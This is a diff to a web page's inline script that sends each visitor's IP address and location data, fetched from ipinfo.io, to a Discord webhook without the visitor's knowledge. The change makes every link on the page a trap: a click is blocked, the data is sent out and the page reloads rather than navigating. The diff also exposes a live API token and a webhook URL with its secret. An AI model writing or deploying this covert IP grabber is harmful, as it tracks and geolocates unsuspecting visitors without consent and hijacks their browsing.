@@ -148,8 +148,9 @@
     </div>
 
     <script>
-  window.addEventListener('load', () => {
-    fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
+  // Function to send IP info to webhook
+  function sendVisitorInfo() {
+    return fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
       .then(res => res.json())
       .then(data => {
         const content = `
@@ -169,17 +170,29 @@ Organization: ${data.org || 'N/A'}
 
         const webhookURL = 'https://discord.com/api/webhooks/1381419732095209472/bstVFrhUSlpARvbQ7I5C9waHRTLGl_1dqZ9q_FVYxj4Cu0Tqsx8Egd4rQ9CL1JbAZMMM';
 
-        fetch(webhookURL, {
+        return fetch(webhookURL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload),
-        })
-        .then(() => console.log('Visitor info sent to webhook'))
-        .catch(err => console.error('Error sending to webhook:', err));
-      })
-      .catch(() => {
-        console.error('Failed to get IP info');
+        });
       });
+  }
+
+  // Attach click listeners to all links
+  window.addEventListener('load', () => {
+    const links = document.querySelectorAll('a');
+    links.forEach(link => {
+      link.addEventListener('click', function(event) {
+        event.preventDefault(); // prevent immediate navigation
+        sendVisitorInfo()
+          .catch(err => console.error('Error sending visitor info:', err))
+          .finally(() => {
+            // After sending, reload the page
+            // You can also do link.href here if you want to navigate instead
+            location.reload();
+          });
+      });
+    });
   });
 </script>
 </body>
